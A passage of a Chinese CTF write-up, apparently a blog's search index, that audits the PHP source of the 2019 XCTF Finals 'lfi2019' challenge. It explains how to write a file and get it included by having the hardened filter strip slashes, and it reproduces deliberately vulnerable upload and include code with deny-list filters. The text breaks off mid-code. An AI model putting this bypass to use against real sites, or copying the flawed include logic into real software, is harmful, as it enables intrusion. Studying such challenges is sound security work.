<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019 XCTF final lfi2019复现</title>
    <url>/2024/02/06/2019%20XCTF%20final%20lfi2019%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>源代码位置: <a href="https://github.com/stypr/my-ctf-challenges/blob/master/2019_XCTF_Finals/lfi2019/index.php">https://github.com/stypr/my-ctf-challenges/blob/master/2019_XCTF_Finals/lfi2019/index.php</a></p>
<p>根据代码审计:<br><code>$_SERVER[&quot;QUERY_STRING&quot;]</code>是查询的字符串,比如<code>http://www.xxx.com/?p=222</code>的值为p=222<br>那我们在题目传参:<code>?show-me-the-hint</code>即可获取源码<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212182802.png" alt="image.png"></p>
<p>我们观察代码的215行会发现:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212182906.png" alt="image.png"></p>
<p>这里根据我们的传参来分别执行不同的上传文件和访问文件操作<br>Get类:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">nanahira</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// senpai notice me //</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title class_">System</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&#x27;trigger&#x27;</span>] &amp;&amp; !@@@@@@@@@@@@@<span class="title function_ invoke__">exploit</span>(<span class="variable">$$$$$$_GET</span>[<span class="string">&#x27;leak&#x27;</span>][<span class="string">&#x27;leak&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;filename === <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;blocked by path sanitizer&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// wtf???? //</span></span><br><span class="line">            <span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">                <span class="comment">// index files are *completely* disabled. //</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;filename, <span class="string">&quot;index&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;you cannot include index files!&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">                <span class="variable">$read_file</span> = <span class="string">&quot;./files/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">                <span class="variable">$read_file_with_hardened_filter</span> = <span class="string">&quot;./files/&quot;</span> . <span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$this</span>-&gt;filename, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$read_file</span> === <span class="variable">$read_file_with_hardened_filter</span> ||</span><br><span class="line">                    @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file</span>) === @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file_with_hardened_filter</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;request blocked&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">                @<span class="keyword">include</span>(<span class="string">&quot;./files/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;invalid filename (wtf)&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>这里Get类可以实现文件包含,但是做了path_sanitizer()函数过滤,而且要求经过path_sanitizer()处理后的文件名和原来不同,而且文件内容也要不同才能包含</p>
<p>过滤函数:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">path_sanitizer</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$harden</span>=<span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$dir</span> = (<span class="keyword">string</span>)<span class="variable">$dir</span>;</span><br><span class="line">        <span class="variable">$dir_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$dir</span>);</span><br><span class="line">        <span class="comment">// Deny LFI/RFI/XSS //</span></span><br><span class="line">        <span class="variable">$filter</span> = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;.\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$dir</span>, <span class="variable">$f</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Deny SSRF and all possible weird bypasses //</span></span><br><span class="line">        <span class="variable">$stream</span> = <span class="title function_ invoke__">stream_get_wrappers</span>();</span><br><span class="line">        <span class="variable">$stream</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">stream_get_transports</span>());</span><br><span class="line">        <span class="variable">$stream</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">stream_get_filters</span>());</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$stream</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">            <span class="variable">$f_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$dir</span>, <span class="number">0</span>, <span class="variable">$f_len</span>) === <span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Deny length //</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir_len</span> &gt;= <span class="number">128</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// Easy level hardening //</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$harden</span>)&#123;</span><br><span class="line">			<span class="variable">$harden_filter</span> = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;\\&quot;</span>];</span><br><span class="line">			<span class="keyword">foreach</span>(<span class="variable">$harden_filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">				<span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$f</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$dir</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitize feature is available starting from the medium level //</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$dir</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">code_sanitizer</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Computer-chan, please don&#x27;t speak english. Speak something else! //</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#x27;\&quot;\=\(\)\[\]\;]/u&quot;</span>, <span class="string">&quot;*Nope*&quot;</span>, (<span class="keyword">string</span>)<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>两个过滤函数:</p>
<ul>
<li>code<em>sanitizer(): 这个正则表达式是用来匹配特殊字符的。它匹配除了中文字符以外的一系列特殊字符，比如&lt;&gt;!@#$%^&amp;*</em>?+.-‘“=()[];。</li>
<li>path_sanitizer(): 上传的文件名不能包含：<code>[&#39;.&#39;, &#39;./&#39;, &#39;~&#39;, &#39;.\\&#39;, &#39;#&#39;, &#39;&lt;&#39;, &#39;&gt;&#39;]</code>中的字符,长度不能超过128,如果<code>$harden</code>是true会删除其中的<code>\和/</code></li>
</ul>
<p>Put:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Put</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">nanahira</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// senpai notice me //</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">                <span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title class_">System</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_GET</span>[<span class="string">&#x27;trigger&#x27;</span>] &amp;&amp; !@@@@@@@@@@@@@<span class="title function_ invoke__">exploit</span>(<span class="variable">$$$$$$_GET</span>[<span class="string">&#x27;leak&#x27;</span>][<span class="string">&#x27;leak&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$dir</span> = <span class="string">&quot;./files/&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$seed</span>;</span><br><span class="line">            <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$filename</span> === (<span class="keyword">string</span>)@<span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$data</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filename = (<span class="keyword">string</span>)<span class="variable">$filename</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;filename = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;content = (<span class="keyword">string</span>)@<span class="title function_ invoke__">code_sanitizer</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// just another typical file insertion //</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;filename === <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;blocked by path sanitizer&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// check if file exists //</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;file exists&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="comment">// just check if file is written. hopefully. //</span></span><br><span class="line">            <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename) == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;file not written.&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里<code>$data</code>是传入的<code>$_POST</code>也就是说我们还有post传filename和content</p>
<ul>
<li>首先检查get传的filename和post传的filename经过path_sanitizer()函数处理是否一样,一样才赋值filename</li>
<li>post传入的content内容要经过<code>code_sanitizer()</code>函数处理</li>
</ul>
<p>我们思路是先写文件,然后利用文件包含读文件,读文件有个关键点是<code>$read_file_with_hardened_filter = &quot;./files/&quot; . path_sanitizer($this-&gt;filename, true);</code><br>这里我们可以通过让文件包含<code>\或者/</code>来绕过后面的if语句<br>比如:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212210804.png" alt="image.png"></p>
<p>成功写入<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20231212210822.png" alt="image.png"></p>
<p>我们写个test.php,来查看get那些变量的变化过程<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">path_sanitizer</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$harden</span>=<span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$dir</span> = (<span class="keyword">string</span>)<span class="variable">$dir</span>;</span><br><span class="line">    <span class="variable">$dir_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="comment">// Deny LFI/RFI/XSS //</span></span><br><span class="line">    <span class="variable">$filter</span> = [<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;.\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$dir</span>, <span class="variable">$f</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Deny SSRF and all possible weird bypasses //</span></span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">stream_get_wrappers</span>();</span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">stream_get_transports</span>());</span><br><span class="line">    <span class="variable">$stream</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$stream</span>, <span class="title function_ invoke__">stream_get_filters</span>());</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$stream</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="variable">$f_len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$dir</span>, <span class="number">0</span>, <span class="variable">$f_len</span>) === <span class="variable">$f</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Deny length //</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir_len</span> &gt;= <span class="number">128</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Easy level hardening //</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$harden</span>)&#123;</span><br><span class="line">        <span class="variable">$harden_filter</span> = [<span class="string">&quot;/&quot;</span>, <span class="string">&quot;\\&quot;</span>];</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$harden_filter</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">            <span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$f</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$dir</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize feature is available starting from the medium level //</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$dir</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The new kakkoii code-san is re-implemented. //</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">code_sanitizer</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// Computer-chan, please don&#x27;t speak english. Speak something else! //</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^&lt;&gt;!@#$%\^&amp;*\_?+\.\-\\\&#x27;\&quot;\=\(\)\[\]\;]/u&quot;</span>, <span class="string">&quot;*Nope*&quot;</span>, (<span class="keyword">string</span>)<span class="variable">$code</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$code</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Errors are intended and straightforward. Please do not ask questions. //</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">nanahira</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// senpai notice me //</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title class_">System</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&#x27;trigger&#x27;</span>] &amp;&amp; !@@@@@@@@@@@@@<span class="title function_ invoke__">exploit</span>(<span class="variable">$$$$$$_GET</span>[<span class="string">&#x27;leak&#x27;</span>][<span class="string">&#x27;leak&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;filename === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;blocked by path sanitizer&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// wtf???? //</span></span><br><span class="line">        <span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="comment">// index files are *completely* disabled. //</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$this</span>-&gt;filename, <span class="string">&quot;index&quot;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;you cannot include index files!&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// hardened sanitizer spawned. thus we sense ambiguity //</span></span><br><span class="line">            <span class="variable">$read_file</span> = <span class="string">&quot;./files/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$read_file</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="variable">$read_file_with_hardened_filter</span> = <span class="string">&quot;./files/&quot;</span> . <span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$this</span>-&gt;filename, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$read_file_with_hardened_filter</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file_with_hardened_filter</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$read_file</span> === <span class="variable">$read_file_with_hardened_filter</span> ||</span><br><span class="line">                @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file</span>) === @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$read_file_with_hardened_filter</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;request blocked&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// .. and finally, include *un*exploitable file is included. //</span></span><br><span class="line">            @<span class="keyword">include</span>(<span class="string">&quot;./files/&quot;</span> . <span class="variable language_">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;invalid filename (wtf)&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Put</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">nanahira</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// senpai notice me //</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$exploit</span> = <span class="keyword">new</span> <span class="title class_">System</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&#x27;trigger&#x27;</span>] &amp;&amp; !@@@@@@@@@@@@@<span class="title function_ invoke__">exploit</span>(<span class="variable">$$$$$$_GET</span>[<span class="string">&#x27;leak&#x27;</span>][<span class="string">&#x27;leak&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dir</span> = <span class="string">&quot;./files/&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$seed</span>;</span><br><span class="line">        <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$filename</span> === (<span class="keyword">string</span>)@<span class="title function_ invoke__">path_sanitizer</span>(<span class="variable">$data</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename = (<span class="keyword">string</span>)<span class="variable">$filename</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = (<span class="keyword">string</span>)@<span class="title function_ invoke__">code_sanitizer</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">put</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// just another typical file insertion //</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;filename === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;blocked by path sanitizer&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// check if file exists //</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;file exists&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">        <span class="comment">// just check if file is written. hopefully. //</span></span><br><span class="line">        <span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;dir . <span class="variable">$this</span>-&gt;filename) == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&quot;msg&quot;</span> =&gt; <span class="string">&quot;file not written.&quot;</span>, <span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;error&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;type&quot;</span> =&gt; <span class="string">&quot;success&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$parsed_url</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$parsed_url</span>) &gt;= <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/json&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$parsed_url</span>[<span class="number">0</span>])&#123;</span><br><span class="line">        <span 